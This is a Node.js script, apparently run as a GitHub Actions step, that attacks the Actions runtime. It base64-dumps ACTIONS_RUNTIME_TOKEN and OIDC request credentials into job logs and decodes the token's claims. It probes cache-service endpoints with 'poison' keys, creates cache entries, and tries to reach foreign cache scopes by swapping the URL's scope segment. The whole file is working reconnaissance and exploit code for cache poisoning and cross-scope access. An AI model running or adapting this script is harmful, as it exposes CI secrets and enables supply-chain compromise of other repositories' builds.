// i11100: dump ACTIONS_RUNTIME_TOKEN scope and probe cache service protocol.
// Runs as an ACTION step (only action steps get runtime creds).
const https = require('https');
const { URL } = require('url');

function dumpEnv(name) {
  const v = process.env[name];
  console.log(`${name}_len=${v ? v.length : 0}`);
  if (v) console.log(`${name}_b64=${Buffer.from(v).toString('base64')}`);
}

console.log('=== I11100 ACTION ENV ===');
['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RUNTIME_URL', 'ACTIONS_CACHE_URL', 'ACTIONS_RESULTS_URL',
 'ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'ACTIONS_ID_TOKEN_REQUEST_URL'].forEach(dumpEnv);

const RT = process.env.ACTIONS_RUNTIME_TOKEN || '';
try {
  const parts = RT.split('.');
  if (parts.length >= 2) {
    const c = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
    console.log('RT_CLAIMS=' + JSON.stringify({
      iss: c.iss, aud: c.aud, scp: c.scp, plan_id: c.plan_id, job_id: c.job_id,
      repository_id: c.repository_id, repository_owner_id: c.repository_owner_id,
      run_id: c.run_id, ref: c.ref, sha: c.sha, ac: c.ac, oidc_sub: c.oidc_sub,
      owner_id: c.owner_id, billing_owner_id: c.billing_owner_id, runner_type: c.runner_type }));
  } else {
    console.log('RT_NOT_JWT len=' + RT.length);
  }
} catch (e) { console.log('RT_DECODE_ERR ' + e); }

function req(method, urlStr, tok, body, timeoutMs) {
  return new Promise((resolve) => {
    let u;
    try { u = new URL(urlStr); } catch (e) { return resolve({ status: -1, body: 'BADURL ' + e, headers: {} }); }
    const data = body === undefined || body === null ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const headers = { 'User-Agent': 'actions-cache/4.0.0' };
    if (tok) headers['Authorization'] = 'Bearer ' + tok;
    if (data !== null) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(data); }
    const opts = { method, headers };
    const r = https.request(u, opts, (resp) => {
      let chunks = [];
      resp.on('data', d => chunks.push(d));
      resp.on('end', () => resolve({
        status: resp.statusCode, headers: resp.headers,
        body: Buffer.concat(chunks).toString('utf8').slice(0, 1200) }));
    });
    r.on('error', e => resolve({ status: -1, body: 'ERR ' + e.message, headers: {} }));
    r.setTimeout(timeoutMs || 25000, () => { r.destroy(); resolve({ status: -2, body: 'TIMEOUT', headers: {} }); });
    if (data !== null) r.write(data);
    r.end();
  });
}

function show(name, res) {
  console.log(`CACHEPROBE ${name} -> ${res.status} ${JSON.stringify(res.body).slice(0, 700)}`);
}

(async () => {
  const CACHE = process.env.ACTIONS_CACHE_URL || '';
  const RESULTS = process.env.ACTIONS_RESULTS_URL || '';
  console.log('CACHE_URL=' + CACHE);
  console.log('RESULTS_URL=' + RESULTS);
  if (!CACHE) { console.log('NO_CACHE_URL'); return; }
  const base = CACHE.endsWith('/') ? CACHE : CACHE + '/';

  // ---- v2 twirp cache protocol (from actions/toolkit) ----
  const twirp = base + 'twirp/github.actions.results.api.v1.CacheService/';
  let r;
  r = await req('POST', twirp + 'GetCacheEntryDownloadURL', RT,
    { key: 'i11100-poison-key', restoreKeys: [], version: 'i11100ver' });
  show('v2_GetCacheEntryDownloadURL_self_logical_key', r);
  try {
    const j = JSON.parse(r.body);
    if (j && (j.signedDownloadUrl || j.signed_download_url)) {
      const dl = j.signedDownloadUrl || j.signed_download_url;
      const g = await req('GET', dl, null, null);
      console.log('DOWNLOAD_STATUS=' + g.status + ' len=' + (g.body || '').length);
      console.log('DOWNLOAD_HEAD=' + Buffer.from(g.body || '', 'utf8').toString('base64').slice(0, 200));
    }
  } catch (e) {}

  r = await req('POST', twirp + 'CreateCacheEntry', RT,
    { key: 'i11100-probe-key', version: 'i11100ver' });
  show('v2_CreateCacheEntry_self', r);
  let createdCacheId = null;
  try { const j = JSON.parse(r.body); createdCacheId = j.cacheId || j.cache_id || null; } catch (e) {}
  console.log('CREATED_CACHE_ID=' + createdCacheId);

  // ---- v1 REST cache protocol ----
  r = await req('GET', base + '_apis/artifactcache/cache?keys=i11100-poison-key&version=i11100ver', RT, null);
  show('v1_query_self', r);
  r = await req('POST', base + '_apis/artifactcache/caches', RT, { key: 'i11100-probe-key', version: 'i11100ver' });
  show('v1_reserve_self', r);
  console.log('V1_RESERVE_B64=' + Buffer.from(r.body || '', 'utf8').toString('base64').slice(0, 300));

  // ---- cross-SCOPE attempts: swap the opaque scope segment in the cache URL path ----
  try {
    const u = new URL(CACHE);
    const segs = u.pathname.split('/').filter(Boolean);   // [scope]
    console.log('CACHE_SCOPE_SEG=' + JSON.stringify(segs));
    const foreignVariants = [
      'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',      // 43 chars of A (base64url-ish)
      'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ',
      '0000000000000000000000000000000000000000000'
    ];
    for (const fv of foreignVariants) {
      const fu = 'https://' + u.host + '/' + fv + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL';
      const rr = await req('POST', fu, RT, { key: 'i11100-poison-key', restoreKeys: [], version: 'i11100ver' });
      show('v2_foreign_scope_' + fv.slice(0, 6), rr);
    }
  } catch (e) { console.log('SCOPE_SWAP_ERR ' + e); }

  // ---- results artifact service with runtime token ----
  if (RESULTS) {
    const rb = RESULTS.endsWith('/') ? RESULTS : RESULTS + '/';
    const rr = await req('POST', rb + 'twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', RT,
      { workflowRunBackendId: (JSON.parse(Buffer.from(RT.split('.')[1], 'base64').toString('utf8')).plan_id),
        workflowJobRunBackendId: (JSON.parse(Buffer.from(RT.split('.')[1], 'base64').toString('utf8')).job_id) });
    show('results_ListArtifacts_self', rr);
  }
  console.log('=== I11100 ACTION DONE ===');
})();
